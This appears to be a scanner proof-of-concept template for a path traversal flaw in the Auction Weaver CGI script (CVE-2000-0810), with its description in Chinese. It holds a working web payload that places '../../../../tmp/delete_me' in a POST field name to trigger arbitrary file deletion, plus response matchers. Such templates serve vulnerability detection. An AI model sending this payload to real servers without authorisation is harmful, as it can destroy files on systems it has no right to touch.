[info]
author = "AVE"
description = "通过向 Auction Weaver CGI 脚本发送包含 .. 序列的表单字段名，验证是否存在路径遍历导致任意文件删除漏洞"
id = "POC-AVE-2000-0958"
name = "CVE-2000-0810 Auction Weaver 目录遍历 PoC"
severity = "high"
tags = ["ave-2000-0958"]
vuln_id = [
    "CVE-2000-0810",
    "AVE-2000-0958",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/auctionweaver.cgi"
protocol = "http"

[poc.requests.body]
content = "item_name=test&../../../../tmp/delete_me=1&submit=Submit"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "success",
    "deleted",
    "completed",
]
